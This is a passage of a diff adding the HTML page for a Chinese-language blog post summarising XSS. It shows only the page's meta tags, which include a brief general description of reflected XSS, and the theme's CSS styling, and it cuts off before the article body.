@@ -1,0 +1,3501 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/#5.8.0'>
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta name="Volantis" content="5.8.0">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <!-- SEO相关 -->
+  
+  <link rel="canonical" href="http://example.com/2024/07/28/xss总结/"/>
+  <!-- 渲染优化 -->
+    <meta http-equiv='x-dns-prefetch-control' content='on' />
+      <link rel='dns-prefetch' href='https://unpkg.com'>
+      <link rel="preconnect" href="https://unpkg.com" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Content-Security-Policy" content=" default-src 'self' https:; block-all-mixed-content; base-uri 'self' https:; form-action 'self' https:; worker-src 'self' https:; connect-src 'self' https: *; img-src 'self' data: https: *; media-src 'self' https: *; font-src 'self' data: https: *; frame-src 'self' https: *; manifest-src 'self' https: *; child-src https:; script-src 'self' https: 'unsafe-inline' *; style-src 'self' https: 'unsafe-inline' *; ">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+  <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
+  <meta content="telephone=no" name="format-detection">
+  <!-- import head_begin begin -->
+  <!-- import head_begin end -->
+  <!-- Custom Files headBegin begin-->
+  
+  <!-- Custom Files headBegin end-->
+  <!-- front-matter head_begin begin -->
+  <!-- front-matter head_begin end -->
+  <link rel="preload" href="/css/style.css" as="style">
+  <link rel="preload" href="https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/VarelaRound/VarelaRound-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+<link rel="preload" href="https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <!-- feed -->
+  <!-- 页面元数据 -->
+  <title>xss总结 - blog</title>
+  <meta name="keywords" content="web安全,xss,null">
+  <meta desc name="description" content="this is my blog - mujietongxue - blog">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss总结">
+<meta property="og:url" content="http://example.com/2024/07/28/xss%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="分类反射型 12反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。不会存在数据库里面，一般出现在查询页面  反射型XSS，又称非持久型XSS，攻击相对于受害者而言是一次性的  具体表现在受害者点击了含有的恶意JavaScript脚本的url，恶意代码并没有保存在目标网站，而Web应用程序只是不加处理">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2024-07-28T11:06:08.000Z">
+<meta property="article:modified_time" content="2024-07-28T14:17:31.875Z">
+<meta property="article:author" content="mujietongxue">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+  <style>
+    /* 首屏样式 */
+    #safearea {
+  display: none;
+}
+:root {
+  --color-site-body: #f4f4f4;
+  --color-site-bg: #f4f4f4;
+  --color-site-inner: #fff;
+  --color-site-footer: #666;
+  --color-card: #fff;
+  --color-text: #444;
+  --color-block: #f6f6f6;
+  --color-inlinecode: #c74f00;
+  --color-codeblock: #fff7ea;
+  --color-h1: #3a3a3a;
+  --color-h2: #3a3a3a;
+  --color-h3: #333;
+  --color-h4: #444;
+  --color-h5: #555;
+  --color-h6: #666;
+  --color-p: #444;
+  --color-list: #666;
+  --color-list-hl: #30ad91;
+  --color-meta: #888;
+  --color-read-bkg: #e0d8c8;
+  --color-read-post: #f8f1e2;
+  --color-copyright-bkg: #f5f5f5;
+}
+* {
+  box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  outline: none;
+  margin: 0;
+  padding: 0;
+}
+*::-webkit-scrollbar {
+  height: 4px;
+  width: 4px;
+}
+*::-webkit-scrollbar-track-piece {
+  background: transparent;
+}
+*::-webkit-scrollbar-thumb {
+  background: #3dd9b6;
+  cursor: pointer;
+  border-radius: 2px;
+  -webkit-border-radius: 2px;
+}
+*::-webkit-scrollbar-thumb:hover {
+  background: #ff5722;
+}
+html {
+  color: var(--color-text);
+  width: 100%;
+  height: 100%;
+  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
+  font-size: 16px;
+}
+html >::-webkit-scrollbar {
+  height: 4px;
+  width: 4px;
+}
+html >::-webkit-scrollbar-track-piece {
+  background: transparent;
+}
+html >::-webkit-scrollbar-thumb {
+  background: #54b5a0 linear-gradient(45deg, rgba(255,255,255,0.4) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0.4) 75%, transparent 75%, transparent);
+  cursor: pointer;
+  border-radius: 2px;
+  -webkit-border-radius: 2px;
+}
+html >::-webkit-scrollbar-thumb:hover {
+  background: #54b5a0 linear-gradient(45deg, rgba(255,255,255,0.4) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0.4) 75%, transparent 75%, transparent);
+}
+body {
+  background-color: var(--color-site-body);
+  text-rendering: optimizelegibility;
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  line-height: 1.6;
+  -webkit-text-size-adjust: 100%;
+  -ms-text-size-adjust: 100%;
+}
+body.modal-active {
+  overflow: hidden;
+}
+@media screen and (max-width: 680px) {
+  body.modal-active {
+    position: fixed;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    left: 0;
+  }
+}
+a {
+  color: #2092ec;
+  cursor: pointer;
+  text-decoration: none;
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+}
+a:hover {
+  color: #ff5722;
+}
+a:active,
+a:hover {
+  outline: 0;
+}
+ul,
+ol {
+  padding-left: 0;
+}
+ul li,
+ol li {
+  list-style: none;
+}
+header {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+}
+img {
+  border: 0;
+  background: none;
+  max-width: 100%;
+}
+svg:not(:root) {
+  overflow: hidden;
+}
+hr {
+  -moz-box-sizing: content-box;
+  box-sizing: content-box;
+  -webkit-box-sizing: content-box;
+  -moz-box-sizing: content-box;
+  height: 0;
+  border: 0;
+  border-radius: 1px;
+  -webkit-border-radius: 1px;
+  border-bottom: 1px solid rgba(68,68,68,0.1);
+}
+button,
+input {
+  color: inherit;
+  font: inherit;
+  margin: 0;
+}
+button {
+  overflow: visible;
+  text-transform: none;
+  -webkit-appearance: button;
+  cursor: pointer;
+}
+@supports (backdrop-filter: blur(20px)) {
+  .blur {
+    background: rgba(255,255,255,0.9) !important;
+    backdrop-filter: saturate(200%) blur(20px);
+  }
+}
+.shadow {
+  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
+  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
+}
+.shadow.floatable {
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+}
+.shadow.floatable:hover {
+  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
+  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
+}
+#l_cover {
+  min-height: 64px;
+}
+.cover-wrapper {
+  top: 0;
+  left: 0;
+  max-width: 100%;
+  height: 100vh;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  flex-wrap: nowrap;
+  -webkit-flex-wrap: nowrap;
+  -khtml-flex-wrap: nowrap;
+  -moz-flex-wrap: nowrap;
+  -o-flex-wrap: nowrap;
+  -ms-flex-wrap: nowrap;
+  -webkit-box-direction: normal;
+  -moz-box-direction: normal;
+  -webkit-box-orient: vertical;
+  -moz-box-orient: vertical;
+  -webkit-flex-direction: column;
+  -ms-flex-direction: column;
+  flex-direction: column;
+  align-items: center;
+  align-self: center;
+  align-content: center;
+  color: var(--color-site-inner);
+  padding: 0 16px;
+  user-select: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  position: relative;
+  overflow: hidden;
+  margin-bottom: -100px;
+}
+.cover-wrapper .cover-bg {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  background-position: center;
+  background-size: cover;
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+}
+.cover-wrapper .cover-bg.lazyload:not(.loaded) {
+  opacity: 0;
+  -webkit-opacity: 0;
+  -moz-opacity: 0;
+}
+.cover-wrapper .cover-bg.lazyload.loaded {
+  animation-delay: 0s;
+  animation-duration: 0.5s;
+  animation-fill-mode: forwards;
+  animation-timing-function: ease-out;
+  animation-name: fadeIn;
+}
+@-moz-keyframes fadeIn {
+  0% {
+    opacity: 0;
+    -webkit-opacity: 0;
+    -moz-opacity: 0;
+    filter: blur(12px);
+    transform: scale(1.02);
+    -webkit-transform: scale(1.02);
+    -khtml-transform: scale(1.02);
+    -moz-transform: scale(1.02);
+    -o-transform: scale(1.02);
+    -ms-transform: scale(1.02);
+  }
+  100% {
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+@-webkit-keyframes fadeIn {
+  0% {
+    opacity: 0;
+    -webkit-opacity: 0;
+    -moz-opacity: 0;
+    filter: blur(12px);
+    transform: scale(1.02);
+    -webkit-transform: scale(1.02);
+    -khtml-transform: scale(1.02);
+    -moz-transform: scale(1.02);
+    -o-transform: scale(1.02);
+    -ms-transform: scale(1.02);
+  }
+  100% {
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+@-o-keyframes fadeIn {
+  0% {
+    opacity: 0;
+    -webkit-opacity: 0;
+    -moz-opacity: 0;
+    filter: blur(12px);
+    transform: scale(1.02);
+    -webkit-transform: scale(1.02);
+    -khtml-transform: scale(1.02);
+    -moz-transform: scale(1.02);
+    -o-transform: scale(1.02);
+    -ms-transform: scale(1.02);
+  }
+  100% {
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+@keyframes fadeIn {
+  0% {
+    opacity: 0;
+    -webkit-opacity: 0;
+    -moz-opacity: 0;
+    filter: blur(12px);
+    transform: scale(1.02);
+    -webkit-transform: scale(1.02);
+    -khtml-transform: scale(1.02);
+    -moz-transform: scale(1.02);
+    -o-transform: scale(1.02);
+    -ms-transform: scale(1.02);
+  }
+  100% {
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+.cover-wrapper .cover-body {
+  z-index: 1;
+  position: relative;
+  width: 100%;
+  height: 100%;
+}
+.cover-wrapper#full {
+  height: calc(100vh + 100px);
+  padding-bottom: 100px;
+}
+.cover-wrapper#half {
+  max-height: 640px;
+  min-height: 400px;
+  height: calc(36vh - 64px + 200px);
+}
+.cover-wrapper #scroll-down {
+  width: 100%;
+  height: 64px;
+  position: absolute;
+  bottom: 100px;
+  text-align: center;
+  cursor: pointer;
+}
+.cover-wrapper #scroll-down .scroll-down-effects {
+  color: #fff;
+  font-size: 24px;
+  line-height: 64px;
+  position: absolute;
+  width: 24px;
+  left: calc(50% - 12px);
+  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
+  animation: scroll-down-effect 1.5s infinite;
+  -webkit-animation: scroll-down-effect 1.5s infinite;
+  -khtml-animation: scroll-down-effect 1.5s infinite;
+  -moz-animation: scroll-down-effect 1.5s infinite;
+  -o-animation: scroll-down-effect 1.5s infinite;
+  -ms-animation: scroll-down-effect 1.5s infinite;
+}
+@-moz-keyframes scroll-down-effect {
+  0% {
+    top: 0;
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+  50% {
+    top: -16px;
+    opacity: 0.4;
+    -webkit-opacity: 0.4;
+    -moz-opacity: 0.4;
+  }
+  100% {
+    top: 0;
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+@-webkit-keyframes scroll-down-effect {
+  0% {
+    top: 0;
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+  50% {
+    top: -16px;
+    opacity: 0.4;
+    -webkit-opacity: 0.4;
+    -moz-opacity: 0.4;
+  }
+  100% {
+    top: 0;
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+@-o-keyframes scroll-down-effect {
+  0% {
+    top: 0;
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+  50% {
+    top: -16px;
+    opacity: 0.4;
+    -webkit-opacity: 0.4;
+    -moz-opacity: 0.4;
+  }
+  100% {
+    top: 0;
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+@keyframes scroll-down-effect {
+  0% {
+    top: 0;
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+  50% {
+    top: -16px;
+    opacity: 0.4;
+    -webkit-opacity: 0.4;
+    -moz-opacity: 0.4;
+  }
+  100% {
+    top: 0;
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+.cover-wrapper .cover-body {
+  margin-top: 64px;
+  margin-bottom: 100px;
+}
+.cover-wrapper .cover-body,
+.cover-wrapper .cover-body .top,
+.cover-wrapper .cover-body .bottom {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  -webkit-box-direction: normal;
+  -moz-box-direction: normal;
+  -webkit-box-orient: vertical;
+  -moz-box-orient: vertical;
+  -webkit-flex-direction: column;
+  -ms-flex-direction: column;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  -webkit-justify-content: center;
+  -khtml-justify-content: center;
+  -moz-justify-content: center;
+  -o-justify-content: center;
+  -ms-justify-content: center;
+  max-width: 100%;
+}
+.cover-wrapper .cover-body .bottom {
+  margin-top: 32px;
+}
+.cover-wrapper .cover-body .title {
+  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
+  font-size: 3.125rem;
+  line-height: 1.2;
+  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
+}
+.cover-wrapper .cover-body .subtitle {
+  font-size: 20px;
+}
+.cover-wrapper .cover-body .logo {
+  max-height: 120px;
+  max-width: calc(100% - 4 * 16px);
+}
+@media screen and (min-height: 1024px) {
+  .cover-wrapper .cover-body .title {
+    font-size: 3rem;
+  }
+  .cover-wrapper .cover-body .subtitle {
+    font-size: 1.05rem;
+  }
+  .cover-wrapper .cover-body .logo {
+    max-height: 150px;
+  }
+}
+.cover-wrapper .cover-body .m_search {
+  position: relative;
+  max-width: calc(100% - 16px);
+  width: 320px;
+  vertical-align: middle;
+}
+.cover-wrapper .cover-body .m_search .form {
+  position: relative;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+  width: 100%;
+}
+.cover-wrapper .cover-body .m_search .icon,
+.cover-wrapper .cover-body .m_search .input {
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+}
+.cover-wrapper .cover-body .m_search .icon {
+  position: absolute;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+  line-height: 2.5rem;
+  width: 32px;
+  top: 0;
+  left: 5px;
+  color: rgba(68,68,68,0.75);
+}
+.cover-wrapper .cover-body .m_search .input {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+  height: 2.5rem;
+  width: 100%;
+  box-shadow: none;
+  -webkit-box-shadow: none;
+  box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  font-size: 0.875rem;
+  -webkit-appearance: none;
+  padding-left: 36px;
+  border-radius: 1.4rem;
+  -webkit-border-radius: 1.4rem;
+  background: rgba(255,255,255,0.6);
+  backdrop-filter: blur(10px);
+  border: none;
+  color: var(--color-text);
+}
+@media screen and (max-width: 500px) {
+  .cover-wrapper .cover-body .m_search .input {
+    padding-left: 36px;
+  }
+}
+.cover-wrapper .cover-body .m_search .input:hover {
+  background: rgba(255,255,255,0.8);
+}
+.cover-wrapper .cover-body .m_search .input:focus {
+  background: #fff;
+}
+.cover-wrapper .list-h {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  -webkit-box-direction: normal;
+  -moz-box-direction: normal;
+  -webkit-box-orient: horizontal;
+  -moz-box-orient: horizontal;
+  -webkit-flex-direction: row;
+  -ms-flex-direction: row;
+  flex-direction: row;
+  flex-wrap: wrap;
+  -webkit-flex-wrap: wrap;
+  -khtml-flex-wrap: wrap;
+  -moz-flex-wrap: wrap;
+  -o-flex-wrap: wrap;
+  -ms-flex-wrap: wrap;
+  align-items: stretch;
+  border-radius: 4px;
+  -webkit-border-radius: 4px;
+  user-select: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+}
+.cover-wrapper .list-h a {
+  -webkit-box-flex: 1;
+  -moz-box-flex: 1;
+  -webkit-flex: 1 0;
+  -ms-flex: 1 0;
+  flex: 1 0;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  font-weight: 600;
+}
+.cover-wrapper .list-h a img {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+  border-radius: 2px;
+  -webkit-border-radius: 2px;
+  margin: 4px;
+  min-width: 40px;
+  max-width: 44px;
+}
+@media screen and (max-width: 768px) {
+  .cover-wrapper .list-h a img {
+    min-width: 36px;
+    max-width: 40px;
+  }
+}
+@media screen and (max-width: 500px) {
+  .cover-wrapper .list-h a img {
+    margin: 2px 4px;
+    min-width: 32px;
+    max-width: 36px;
+  }
+}
+@media screen and (max-width: 375px) {
+  .cover-wrapper .list-h a img {
+    min-width: 28px;
+    max-width: 32px;
+  }
+}
+.cover-wrapper {
+  max-width: 100%;
+}
+.cover-wrapper.search .bottom .menu {
+  margin-top: 16px;
+}
+.cover-wrapper.search .bottom .menu .list-h a {
+  white-space: nowrap;
+  -webkit-box-direction: normal;
+  -moz-box-direction: normal;
+  -webkit-box-orient: horizontal;
+  -moz-box-orient: horizontal;
+  -webkit-flex-direction: row;
+  -ms-flex-direction: row;
+  flex-direction: row;
+  align-items: baseline;
+  padding: 2px;
+  margin: 4px;
+  color: var(--color-site-inner);
+  opacity: 0.75;
+  -webkit-opacity: 0.75;
+  -moz-opacity: 0.75;
+  text-shadow: 0 1px 2px rgba(0,0,0,0.05);
+  border-bottom: 2px solid transparent;
+}
+.cover-wrapper.search .bottom .menu .list-h a i {
+  margin-right: 4px;
+}
+.cover-wrapper.search .bottom .menu .list-h a p {
+  font-size: 0.9375rem;
+}
+.cover-wrapper.search .bottom .menu .list-h a:hover,
+.cover-wrapper.search .bottom .menu .list-h a.active,
+.cover-wrapper.search .bottom .menu .list-h a:active {
+  opacity: 1;
+  -webkit-opacity: 1;
+  -moz-opacity: 1;
+  border-bottom: 2px solid var(--color-site-inner);
+}
+@font-face {
+  font-family: 'UbuntuMono';
+  src: url("https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf");
+  font-weight: 'normal';
+  font-style: 'normal';
+  font-display: swap;
+}
+@font-face {
+  font-family: 'Varela Round';
+  src: url("https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/VarelaRound/VarelaRound-Regular.ttf");
+  font-weight: 'normal';
+  font-style: 'normal';
+  font-display: swap;
+}
+.l_header {
+  position: fixed;
+  z-index: 1000;
+  top: 0;
+  width: 100%;
+  height: 64px;
+  background: var(--color-card);
+  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
+  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
+}
+.l_header.auto {
+  transition: opacity 0.4s ease;
+  -webkit-transition: opacity 0.4s ease;
+  -khtml-transition: opacity 0.4s ease;
+  -moz-transition: opacity 0.4s ease;
+  -o-transition: opacity 0.4s ease;
+  -ms-transition: opacity 0.4s ease;
+  visibility: hidden;
+}
+.l_header.auto.show {
+  opacity: 1 !important;
+  -webkit-opacity: 1 !important;
+  -moz-opacity: 1 !important;
+  visibility: visible;
+}
+.l_header .container {
+  margin-left: 16px;
+  margin-right: 16px;
+}
+.l_header #wrapper {
+  height: 100%;
+  user-select: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+}
+.l_header #wrapper .nav-main,
+.l_header #wrapper .nav-sub {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  flex-wrap: nowrap;
+  -webkit-flex-wrap: nowrap;
+  -khtml-flex-wrap: nowrap;
+  -moz-flex-wrap: nowrap;
+  -o-flex-wrap: nowrap;
+  -ms-flex-wrap: nowrap;
+  justify-content: space-between;
+  -webkit-justify-content: space-between;
+  -khtml-justify-content: space-between;
+  -moz-justify-content: space-between;
+  -o-justify-content: space-between;
+  -ms-justify-content: space-between;
+  align-items: center;
+}
+.l_header #wrapper .nav-main {
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+}
+.l_header #wrapper.sub .nav-main {
+  transform: translateY(-64px);
+  -webkit-transform: translateY(-64px);
+  -khtml-transform: translateY(-64px);
+  -moz-transform: translateY(-64px);
+  -o-transform: translateY(-64px);
+  -ms-transform: translateY(-64px);
+}
+.l_header #wrapper .nav-sub {
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+  opacity: 0;
+  -webkit-opacity: 0;
+  -moz-opacity: 0;
+  height: 64px;
+  width: calc(100% - 2 * 16px);
+  position: absolute;
+}
+.l_header #wrapper .nav-sub ::-webkit-scrollbar {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: none;
+}
+@media screen and (min-width: 2048px) {
+  .l_header #wrapper .nav-sub {
+    max-width: 55vw;
+    margin: auto;
+  }
+}
+.l_header #wrapper.sub .nav-sub {
+  opacity: 1;
+  -webkit-opacity: 1;
+  -moz-opacity: 1;
+}
+.l_header #wrapper .title {
+  position: relative;
+  color: var(--color-text);
+  padding-left: 24px;
+  max-height: 64px;
+}
+.l_header #wrapper .nav-main .title {
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  flex-shrink: 0;
+  line-height: 64px;
+  padding: 0 24px;
+  font-size: 1.25rem;
+  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
+}
+.l_header #wrapper .nav-main .title img {
+  height: 64px;
+}
+.l_header .nav-sub {
+  max-width: 1080px;
+  margin: auto;
+}
+.l_header .nav-sub .title {
+  font-weight: bold;
+  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
+  line-height: 1.2;
+  max-height: 64px;
+  white-space: normal;
+  flex-shrink: 1;
+}
+.l_header .switcher {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: none;
+  line-height: 64px;
+  align-items: center;
+}
+.l_header .switcher .s-toc {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: none;
+}
+@media screen and (max-width: 768px) {
+  .l_header .switcher .s-toc {
+    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+    display: -ms-flexbox /* TWEENER - IE 10 */;
+    display: -webkit-flex /* NEW - Chrome */;
+    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+    display: flex;
+  }
+}
+.l_header .switcher >li {
+  height: 48px;
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+  margin: 2px;
+}
+@media screen and (max-width: 500px) {
+  .l_header .switcher >li {
+    margin: 0 1px;
+    height: 48px;
+  }
+}
+.l_header .switcher >li >a {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  justify-content: center;
+  -webkit-justify-content: center;
+  -khtml-justify-content: center;
+  -moz-justify-content: center;
+  -o-justify-content: center;
+  -ms-justify-content: center;
+  align-items: center;
+  width: 48px;
+  height: 48px;
+  padding: 0.85em 1.1em;
+  border-radius: 100px;
+  -webkit-border-radius: 100px;
+  border: none;
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+  color: #3dd9b6;
+}
+.l_header .switcher >li >a:hover {
+  border: none;
+}
+.l_header .switcher >li >a.active,
+.l_header .switcher >li >a:active {
+  border: none;
+  background: var(--color-site-bg);
+}
+@media screen and (max-width: 500px) {
+  .l_header .switcher >li >a {
+    width: 36px;
+    height: 48px;
+  }
+}
+.l_header .nav-sub .switcher {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+}
+.l_header .m_search {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  height: 64px;
+  width: 240px;
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+}
+@media screen and (max-width: 1024px) {
+  .l_header .m_search {
+    width: 44px;
+    min-width: 44px;
+  }
+  .l_header .m_search input::placeholder {
+    opacity: 0;
+    -webkit-opacity: 0;
+    -moz-opacity: 0;
+  }
+  .l_header .m_search:hover {
+    width: 240px;
+  }
+  .l_header .m_search:hover input::placeholder {
